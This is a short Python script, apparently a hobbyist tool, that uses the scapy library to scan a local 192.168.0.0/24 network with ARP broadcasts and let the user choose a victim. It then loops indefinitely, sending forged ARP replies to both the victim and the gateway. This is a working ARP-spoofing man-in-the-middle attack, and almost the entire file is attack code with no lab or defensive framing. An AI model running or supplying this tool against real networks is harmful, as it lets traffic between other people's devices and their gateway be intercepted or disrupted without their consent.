import scapy.all as scapy
import random
import socket
import time

#find all other devices on the network and generate a list of their IPs
#pick an IP address at random from that list
#send packets to FF:FF:FF:FF:FF:FF (global transmission) to update the ARP tables of each machine in the network

ipList=[]
macList=[]

def scan_network(ips):
    arp = scapy.ARP(pdst = ips)
    ether = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
    broadcast = ether/arp
    ans, unans = scapy.srp(broadcast, timeout = 5)
    for x in ans:
        #print(x[1].psrc + " " + x[1].hwsrc)
        ipList.append(x[1].psrc)
        macList.append(x[1].hwsrc)

def getMAC(targetip):
    packet = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")/scapy.ARP(op=1, pdst = targetip)
    targetmac = scapy.srp(packet, timeout=2)[0][0][1].hwsrc
    return targetmac

def spoofarp(targetip, targetmac, sourceip):
    spoof = scapy.ARP(op=2, pdst = targetip, psrc = sourceip, hwdst = targetmac)
    scapy.send(spoof, verbose=False)

def Main():
    #try:
        print("Enter gateway IP")
        gatewayIP = input()
        gatewayMAC = getMAC(gatewayIP)
        scan_network("192.168.0.0/24")
        print("Enter the number representing the index of the IP you wish to spoof")
        print(ipList)
       # targetIP = random.randint(0, len(ipList)-1)
        #temp = int(input())
        while True:
            temp = int(input())
            if(temp < 0 or temp > len(ipList)-1):
                print("Invalid index")
            
            else:
                targetIP = ipList[temp]
                targetMAC = macList[temp]
                print("target IP is "+targetIP)
                print("target MAC is "+targetMAC)
                break
        
        print("Spoofing")
        while True:
            spoofarp(targetIP, targetMAC, gatewayIP)
            spoofarp(gatewayIP, gatewayMAC, targetIP)
            time.sleep(1)

        
    #except:
    #   print("Scan failed")

if __name__ == '__main__':
    Main()
